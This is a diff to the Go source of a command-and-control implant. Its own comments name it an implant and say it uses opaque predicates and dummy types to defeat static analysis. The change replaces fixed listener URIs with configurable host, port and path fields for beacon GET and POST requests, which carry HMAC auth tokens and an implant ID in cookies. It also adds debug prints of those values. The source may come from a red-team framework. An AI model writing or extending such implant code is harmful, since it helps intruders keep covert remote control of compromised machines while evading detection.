@@ -24,12 +24,6 @@ type ResponseData struct {
 // CompUUID The 4 byte ID for the implant to use set at compile time
 var CompUUID string
 
-// PostURI The POST URI to use, varies on if compression is enabled or not
-var PostURI string
-
-// GetURI The GET URI to use, varies on if auth is enabled or not
-var GetURI string
-
 // Used to mess up static analysis
 type unknown struct {
 	primaryField bool
@@ -104,9 +98,9 @@ func main() {
 			for {
 				// opaque predicate to branch path again
 				baseUrl := ""
-				baseUrl = "http://" + conf.Listener + GetURI
+				baseUrl = conf.Method + "://" + conf.Host + ":" + conf.Port + conf.GetPath
 				postUrl := ""
-				postUrl = "http://" + conf.Listener + PostURI
+				postUrl = conf.Method + "://" + conf.Host + ":" + conf.Port + conf.PostPath
 
 				token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)
 
@@ -115,6 +109,7 @@ func main() {
 				// Prepare the hmac params (timestamp and token)
 				// params := http.Cookie{}
 				hardVals := fmt.Sprintf("timestamp=%s&token=%s&id=%s", timestamp, token, CompUUID)
+				fmt.Println(hardVals)
 
 				// compedData is hardVals compressed using zlib
 				// if enabled at compile time, DoComp returns the compressed object and bool true
@@ -196,15 +191,17 @@ func main() {
 						break
 					}
 				} else {
-					//fmt.Println("Not compressing data")
+					fmt.Println("Not compressing data")
 					tokenCookie := &http.Cookie{Name: "token", Value: token}
 					timestampCookie := &http.Cookie{Name: "timestamp", Value: timestamp}
 					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
+					fmt.Println(token, timestamp, CompUUID)
 					//reqURL.RawQuery = params.Encode()
 					//fmt.Println(reqURL.String())
 					// makeGetRequest 3 times with a 10-second delay between each attempt
 					// if the request is successful, break the loop
 					// otherwise, the 3 timeouts cause the program to exit
+					fmt.Println(baseUrl)
 					resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie, timestampCookie, impIdCookie)
 					if err != nil {
 						//fmt.Println("Final error:", err)
